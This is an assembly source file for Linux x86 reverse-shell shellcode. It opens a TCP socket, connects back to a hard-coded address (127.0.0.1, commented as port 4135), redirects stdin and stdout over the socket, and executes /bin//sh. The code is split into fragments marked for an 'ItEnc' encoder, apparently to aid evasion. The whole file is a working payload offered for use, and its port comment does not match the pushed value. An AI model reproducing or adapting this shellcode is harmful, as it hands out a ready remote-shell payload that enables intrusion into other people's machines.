;Shellcode linux/x86 reverse shell
;Author : RJF via Gaussillusion 

BITS 32

frag0:
mov  edi,esp ; restore stack point when done
xor  eax,eax
xor  ebx,ebx
xor  edx,edx
push eax ;st+4


; create socket
mov  al,102                           ; socketcall 0x66
inc  ebx                              ; b=1, _socket
push edx                              ; protocol = 0 st+8
push BYTE 0x1                         ; SOCK_STREAM = 1 st+9
push BYTE 0x2                         ; AF_INET = 2 st+10
mov  ecx,esp                          ; set args*
int  0x80                             ; _socket (args* = {int domain = 0x2 (AF_INET), int type = 0x1 (SOCK_STREAM), int protocol = edx,0x0 (TCP/IP)});
; eax = file descriptor on success
;jnz socketcreated                     ; if socket successful, continue, else exit cleanly
;xor eax, eax                          
;inc eax                               ; _exit 0x1
;xor ebx, ebx                          
;inc ebx                               ; status = 1
;int 0x80                              ; _exit (status);

; frag0 clean up stack. note that eax must not be clobbered
;add  esp,10
mov  esp,edi
;jmp  frag0
nop
nop
;ItEnc end frag0
frag1:
; find a register to put esp in
mov edi,esp

socketcreated:                        ; ItEnc must preserve eax
xor  ebx,ebx                          ; ItEnc clear ebx
; connect to remote host
;mov  edi,eax                          ; store returned sockfd

;mov  al,102                           ; socketcall
mov  bl,3                             ; b=3, _connect
push DWORD 0x0100007f                 ; 127.0.0.1   st+4
push WORD  0x1027                     ; port 4135   st+6
mov  si,0x2                           ; sockaddr family
push WORD  si                         ; AF_INET = 2 st+8
mov  edx,esp                          ; set struct sockaddr*
push BYTE 16                          ; addrlen     st+9
push edx                              ; struct sockaddr* st+13
push eax;edi                          ; push sockfd , so you can use eax for syscall num     st+17
mov  al,102                           ; socketcall
mov  ecx,esp                          ; set args*
int  0x80                             ; _connect (args* {int sockfd = edi, const struct sockaddr *addr = {0x2, port 4135, ip 127.0.0.1}, socklen_t addrlen = 16});
pop  eax                  ; get back sockfd
; eax = 0 on success
;jz connected                          ; if connection successful, continue, else exit cleanly
;xor eax, eax                          
;inc eax                               ; _exit 0x1
;xor ebx, ebx                          
;inc ebx
;inc ebx                               ; status = 2
;int 0x80                              ; _exit (status);

; frag1 clean up stack. note that eax must not be clobbered
;add  esp,17
mov  esp,edi
;pop  DWORD ebx
;pop  WORD ebx
;pop  WORD bx
;pop  BYTE bl 
;pop  ebx
;pop  ebx
;mov  eax,edi                           ; ItEnc put sockfd into eax to preserve it
;jmp  frag1
nop
nop
; ItEnc end frag1
frag2:
;mov edi,esp stack is not used in this frag

connected:
xor  ecx,ecx
; dup I/O so shell sends data over socket
;mov  ebx,edi                          ; oldfd = sockfd
mov  ebx,eax                          ; ItEnc sockfd is in eax not edi, this puts it into ebx
xor  eax,eax                          ; ItEnc zero out eax
mov  al,63                            ; _dup2 0x3f
mov  cl,0                             ; newfd, standard input
int  0x80                             ; _dup (sockfd, stdin);

mov  al,63                            ; _dup2 0x3f
mov  cl,1                             ; newfd, standard out
int  0x80                             ; _dup (sockfd, stdout);

;mov eax,ebx                           ; ItEnc no more need for sockfd otherwise put sockfd into eax to preserve it
; some people also dup stderr: 
;mov al,63
;mov cl,2
;int 0x80

; frag2 clean up stack.
;add  esp,17
;jmp  frag2
;mov  esp,edi
nop
nop
; ItEnc end frag2
frag3:
; last frag, so stack doesn't matter

; spawn shell
xor  ecx,ecx
push ecx                              ; null string termination st+4
push 0x68732f2f ; st+8
push 0x6e69622f                       ; /bin//sh st+12

xor  eax,eax                          ; zero out reg
mov  al,11                            ; _execve 0xb
mov  ebx,esp                          ; filename = "/bin//sh"
push ecx                              ; generate a 32b null (empty array for envp) st+16
mov  edx,esp                          ; envp = array of 0x0s
push ebx                              ; cmd = "/bin//sh" st+20
mov  ecx,esp                          ; argv*
int  0x80                             ; _execve (const char* filename = "/bin//sh", char* const argv {"/bin//sh", NULL}, char* const envp {NULL});

; frag3 no need to clean up, no need to jmp back
;add esp,20
;jmp  frag3
; ItEnc end frag3
